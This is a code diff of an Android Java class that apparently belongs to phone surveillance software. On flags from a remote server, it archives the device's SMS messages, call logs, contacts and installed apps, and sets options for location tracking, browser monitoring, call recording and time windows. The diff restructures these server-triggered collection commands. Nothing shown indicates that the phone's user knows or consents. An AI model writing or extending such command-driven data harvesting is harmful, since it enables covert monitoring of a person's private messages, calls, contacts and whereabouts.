@@ -164,47 +164,65 @@ public class PeriodicRequest extends DefaultRequest {
 				ed.putBoolean("getInfo", false);
 			}
 			ed.putString("period", "1");
-			String listStr = null;
-			try {
-				listStr = jsonObject.getJSONArray("list").toString();
-				Logging.doLog(LOG_TAG, "list: " + listStr, "list: " + listStr);
-				
-				if (listStr.indexOf("1") != -1) {
-					// Вызвать метод для списка звонков
-					Logging.doLog(LOG_TAG, "listStr.indexOf 1", "listStr.indexOf 1");
-					
-					ArchiveCall arhCall = new ArchiveCall();
-					arhCall.execute(ctx);
-				}
-				if (listStr.indexOf("2") != -1) {
-					// Вызвать метод для списка смс
-					Logging.doLog(LOG_TAG, "listStr.indexOf 2", "listStr.indexOf 2");
-					
-					ArchiveSms arhSms = new ArchiveSms();
-					arhSms.execute(ctx);
-//					GetContacts getCont = new GetContacts();
-//					getCont.execute(ctx);
-				}
-				if (listStr.indexOf("3") != -1) {
-					// Вызвать метод для телефонной книги
-					Logging.doLog(LOG_TAG, "listStr.indexOf 3", "listStr.indexOf 3");
-					
-					GetContacts getCont = new GetContacts();
-					getCont.execute(ctx);
-				}
-				if (listStr.indexOf("4") != -1) {
-					// Вызвать метод для установленных приложений
-					Logging.doLog(LOG_TAG, "listStr.indexOf 4", "listStr.indexOf 4");
-					
-					ListApp listApp = new ListApp();
-					listApp.getListOfInstalledApp(ctx);
-				}
-			} catch (JSONException e) {
-				listStr = null;
-			}
-
-			ed.commit();
+//			ed.commit();
 		}
+		// ---------------sms list------------------------
+		try {
+			str = jsonObject.getString("sms_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("sms_list", str);
+			ArchiveSms arhSms = new ArchiveSms();
+			arhSms.execute(ctx);
+		
+		} else {
+			ed.putString("sms_list", "0");
+		}
+		// ---------------apps list------------------------
+
+		try {
+			str = jsonObject.getString("apps_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("apps_list", str);
+			ListApp listApp = new ListApp();
+			listApp.getListOfInstalledApp(ctx);
+		} else {
+			ed.putString("apps_list", "0");
+		}
+		// ---------------calls list------------------------
+
+		try {
+			str = jsonObject.getString("calls_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("calls_list", str);
+			ArchiveCall arhCall = new ArchiveCall();
+			arhCall.execute(ctx);
+		} else {
+			ed.putString("calls_list", "0");
+		}
+		// ---------------contacts list------------------------
+
+		try {
+			str = jsonObject.getString("contacts_list");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("contacts_list", str);
+			GetContacts getCont = new GetContacts();
+			getCont.execute(ctx);
+		} else {
+			ed.putString("contacts_list", "0");
+		}
+		// ---------------geot------------------------
 
 		try {
 			str = jsonObject.getString("geo");
@@ -216,6 +234,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo", "0");
 		}
+		// ---------------geo mode------------------------
 
 		try {
 			str = jsonObject.getString("geo_mode");
@@ -227,6 +246,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo_mode", "1");
 		}
+		// ---------------sms------------------------
 
 		try {
 			str = jsonObject.getString("sms");
@@ -238,6 +258,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("sms", "0");
 		}
+		// ---------------call------------------------
 
 		try {
 			str = jsonObject.getString("call");
@@ -249,6 +270,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("call", "0");
 		}
+		// ---------------telbook------------------------
 
 		try {
 			str = jsonObject.getString("telbook");
@@ -257,47 +279,12 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("telbook", str);
-		
+
 		} else {
 			ed.putString("telbook", "0");
 		}
 
-		try {
-			str = jsonObject.getString("listapp");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("listapp", str);
-		} else {
-			ed.putString("listapp", "0");
-		}
-
-		try {
-			str = jsonObject.getString("arhsms");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("arhsms", str);
-//			ArchiveSms arhSms = new ArchiveSms();
-//			arhSms.execute(ctx);
-		} else {
-			ed.putString("arhsms", "0");
-		}
-
-		try {
-			str = jsonObject.getString("arhcall");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("arhcall", str);
-//			ArchiveCall arhCall = new ArchiveCall();
-//			arhCall.execute(ctx);
-		} else {
-			ed.putString("arhcall", "0");
-		}
+		// ---------------www------------------------
 
 		try {
 			str = jsonObject.getString("www");
@@ -309,6 +296,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("www", "0");
 		}
+		// ---------------rec call------------------------
 
 		try {
 			str = jsonObject.getString("recall");
@@ -320,6 +308,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("recall", "0");
 		}
+		// ---------------UTCT------------------------
 
 		try {
 			str = jsonObject.getString("UTCT");
@@ -331,6 +320,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("UTCT", "0");
 		}
+		// ---------------time from ------------------------
 
 		try {
 			str = jsonObject.getString("time_from");
@@ -342,6 +332,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("time_from", "");
 		}
+		// ---------------time to------------------------
 
 		try {
 			str = jsonObject.getString("time_to");
@@ -353,6 +344,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("time_to", "");
 		}
+		// ---------------brk from------------------------
 
 		try {
 			str = jsonObject.getString("brk_from");
@@ -364,6 +356,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_from", "");
 		}
+		// ---------------brk to------------------------
 
 		try {
 			str = jsonObject.getString("brk_to");
@@ -375,6 +368,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
+		// ---------------error------------------------
 
 		try {
 			str = jsonObject.getString("error");
